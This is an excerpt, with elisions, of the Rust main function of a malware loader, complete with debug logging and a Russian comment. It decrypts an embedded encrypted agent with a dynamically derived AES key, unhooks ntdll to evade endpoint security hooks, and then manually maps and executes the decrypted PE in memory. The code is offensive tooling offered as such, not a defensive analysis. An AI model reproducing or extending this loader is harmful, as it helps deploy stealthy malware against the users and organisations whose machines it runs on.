...
fn main() -> Result<(), Box<dyn Error>> {
    ...
    log(&format!("[DEBUG] ENCRYPTED_AGENT size: {} bytes", ENCRYPTED_AGENT.len()));
    
    // ИСПРАВЛЕНО: Используем динамический ключ
    let key = get_decryption_key();
    log(&format!("[DEBUG] Dynamic AES key size: {} bytes", key.len()));
    ...
    match unhook_ntdll() {
        ...
        Err(e) => log(&format!("[!] NTDLL unhook failed: {}", e)),
    }
    ...
    log(&format!("[+] Embedded encrypted payload size: {} bytes", encrypted.len()));
    log(&format!("[+] Dynamic AES key size: {} bytes", key.len()));
    ...
    let decrypted = match std::panic::catch_unwind(|| {
        ...
        Ok(data) => {
            log(&format!("[+] Payload decrypted successfully: {} bytes", data.len()));
            data
        },
        Err(_) => {
    ...
    match PELoader::new(&decrypted) {
        Ok(pe_loader) => {
            ...
            log(&format!("[DEBUG] PE entry point: 0x{:X}", pe_loader.get_entry_point()));
            log(&format!("[DEBUG] PE image size: {} bytes", pe_loader.get_image_size()));
            ...
            match ManualMapper::new(pe_loader) {
                Ok(mut mapper) => {
                    ...
                    if let Err(e) = mapper.map_sections() {
                        log(&format!("[!] Failed to map sections: {}", e));
                    ...
                    if let Err(e) = mapper.resolve_imports() {
                        log(&format!("[!] Failed to resolve imports: {}", e));
                        std::thread::sleep(std::time::Duration::from_secs(5));
                        return Ok(());
                    }
                    ...
                    if let Err(e) = mapper.execute() {
                        log(&format!("[!] Failed to execute PE: {}", e));
                        std::thread::sleep(std::time::Duration::from_secs(5));
                        return Ok(());
                    }
                ...
                Err(e) => {
                    log(&format!("[!] Failed to create mapper: {}", e));
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
            }
        },
        Err(e) => {
            log(&format!("[!] Failed to parse PE: {}", e));
            std::thread::sleep(std::time::Duration::from_secs(5));
        }
    }
